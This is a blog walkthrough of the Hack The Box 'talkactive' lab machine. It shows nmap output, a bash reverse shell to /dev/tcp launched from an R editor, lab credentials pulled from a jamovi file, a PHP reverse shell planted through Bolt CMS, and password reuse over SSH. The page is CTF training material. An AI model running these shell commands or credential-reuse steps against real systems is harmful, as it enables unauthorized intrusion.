@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	09 Apr 2022IP:	10.10.11.155">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[talkactive]">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/04/10/talkactive/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	09 Apr 2022IP:	10.10.11.155">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2197.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2198.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2199.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2200.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2201.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2202.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2203.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2204.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2205.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2206.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2207.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2208.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2209.jpg">
+<meta property="article:published_time" content="2022-04-10T13:04:20.000Z">
+<meta property="article:modified_time" content="2022-08-27T17:33:04.895Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2197.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/04/10/talkactive/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/04/10/talkactive/","path":"2022/04/10/talkactive/","title":"Hack-The-Box-walkthrough[talkactive]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[talkactive] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#initial-shell"><span class="nav-number">3.</span> <span class="nav-text">initial shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#move-on-to-root"><span class="nav-number">4.</span> <span class="nav-text">move on to root</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/04/10/talkactive/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[talkactive] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[talkactive]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-04-10 21:04:20" itemprop="dateCreated datePublished" datetime="2022-04-10T21:04:20+08:00">2022-04-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-28 01:33:04" itemprop="dateModified" datetime="2022-08-28T01:33:04+08:00">2022-08-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	09 Apr 2022<br>IP:	10.10.11.155</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2197.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.155</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.52</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">8080/tcp open  http    Tornado httpd 5.0</span><br><span class="line">8081/tcp open  http    Tornado httpd 5.0</span><br><span class="line">8082/tcp open  http    Tornado httpd 5.0</span><br></pre></td></tr></table></figure>
+
+<p>we found several web service:</p>
+<ul>
+<li><p>Bolt CMS</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2198.jpg"></p>
+</li>
+<li><p>jamovi 0.9.5.5</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2199.jpg"></p>
+</li>
+<li><p>ROCKET.CHAT</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2200.jpg"></p>
+</li>
+</ul>
+<h1 id="initial-shell"><a href="#initial-shell" class="headerlink" title="initial shell"></a>initial shell</h1><p>go to :8080, open RJ editor add this line excecute ruby command to get a shell. &#x3D;&gt;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.18/9001 0&gt;&amp;1&#x27;&quot;</span>,intern=TRUE)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2201.jpg"></li>
+</ul>
+<p>and we found a .omv file, just download and extract it and u will get creds.</p>
+<p>i used pwncat, so it could download or upload files easily</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NhbGVic3Rld2FydC9wd25jYXQ=">pwncat<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@b06821bbda78:/root<span class="comment"># ls</span></span><br><span class="line">Documents  bolt-administration.omv</span><br><span class="line">(<span class="built_in">local</span>) pwncat$ download /root/bolt-administration.omv ./bolt-administration.omv</span><br><span class="line">/root/bolt-administration.omv ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 2.2/2.2 KB • ? • 0:00:00</span><br><span class="line">[09:41:08] downloaded 2.19KiB <span class="keyword">in</span> 2.86 seconds</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># file bolt-administration.omv </span></span><br><span class="line">bolt-administration.omv: Zip archive data, at least v2.0 to extract, compression method=deflate</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># unzip bolt-administration.omv </span></span><br><span class="line">Archive:  bolt-administration.omv</span><br><span class="line">  inflating: META-INF/MANIFEST.MF    </span><br><span class="line">  inflating: meta                    </span><br><span class="line">  inflating: index.html              </span><br><span class="line">  inflating: metadata.json           </span><br><span class="line">  inflating: xdata.json              </span><br><span class="line">  inflating: data.bin                </span><br><span class="line">  inflating: 01 empty/analysis</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># cat xdata.json | jq .   </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;A&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: [</span><br><span class="line">      [</span><br><span class="line">        0,</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        1,</span><br><span class="line">        <span class="string">&quot;matt@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;matt@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        2,</span><br><span class="line">        <span class="string">&quot;janit@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;janit@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        3,</span><br><span class="line">        <span class="string">&quot;saul@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;saul@talkative.htb&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ]</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;B&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: [</span><br><span class="line">      [</span><br><span class="line">        0,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        1,</span><br><span class="line">        <span class="string">&quot;jeO09ufhWD&lt;s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jeO09ufhWD&lt;s&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        2,</span><br><span class="line">        <span class="string">&quot;bZ89h&#125;V&lt;S_DA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bZ89h&#125;V&lt;S_DA&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ],</span><br><span class="line">      [</span><br><span class="line">        3,</span><br><span class="line">        <span class="string">&quot;)SQWGm&gt;9KHEA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;)SQWGm&gt;9KHEA&quot;</span>,</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">      ]</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;C&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;labels&quot;</span>: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>now Go to :80, &#x2F;bolt login with the creds:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:jeO09ufhWD&lt;s</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2202.jpg"></li>
+</ul>
+<p>now Modify the <span class="exturl" data-url="aHR0cDovL3RhbGthdGl2ZS5odGIvYm9sdC9maWxlLWVkaXQvY29uZmlnP2ZpbGU9L2J1bmRsZXMucGhw">http://talkative.htb/bolt/file-edit/config?file=/bundles.php<i class="fa fa-external-link-alt"></i></span> bundles file, add a PHP rev shell, u will get shell on another container.</p>
+<p>on the container as www-data, use ssh to login on main host ssh <span class="exturl" data-url="bWFpbHRvOiYjeDczOyYjeDYxOyYjeDc1OyYjeDZjOyYjNjQ7JiN4MzE7JiN4Mzc7JiM1MDsmIzQ2OyYjNDk7JiN4Mzg7JiM0NjsmI3gzMDsmIzQ2OyYjNDk7">&#x73;&#x61;&#x75;&#x6c;&#64;&#x31;&#x37;&#50;&#46;&#49;&#x38;&#46;&#x30;&#46;&#49;<i class="fa fa-external-link-alt"></i></span> with the same bolt password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># pwncat-cs -lp 1234                           </span></span><br><span class="line">[09:52:38] Welcome to pwncat 🐈!                                                                                     __main__.py:164</span><br><span class="line">[09:54:49] received connection from 10.10.11.155:60622                                                                    bind.py:84</span><br><span class="line">[09:54:56] 0.0.0.0:1234: upgrading from /bin/dash to /bin/bash                                                        manager.py:957</span><br><span class="line">[09:54:59] 10.10.11.155:60622: registered new host w/ db                                                              manager.py:957</span><br><span class="line">(<span class="built_in">local</span>) pwncat$ back</span><br><span class="line">(remote) www-data@ad8ae3998918:/$ <span class="built_in">ls</span></span><br><span class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">(remote) www-data@ad8ae3998918:/$ ssh saul@172.18.0.1</span><br><span class="line">The authenticity of host <span class="string">&#x27;172.18.0.1 (172.18.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Could not create directory &#x27;</span>/var/www/.ssh<span class="string">&#x27; (Permission denied).</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">saul@172.18.0.1&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun 10 Apr 2022 01:56:50 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:                      0.0</span><br><span class="line">  Usage of /:                       78.5% of 8.80GB</span><br><span class="line">  Memory usage:                     70%</span><br><span class="line">  Swap usage:                       2%</span><br><span class="line">  Processes:                        392</span><br><span class="line">  Users logged <span class="keyword">in</span>:                  1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-ea74c394a147: 172.18.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0:            10.10.11.155</span><br><span class="line">  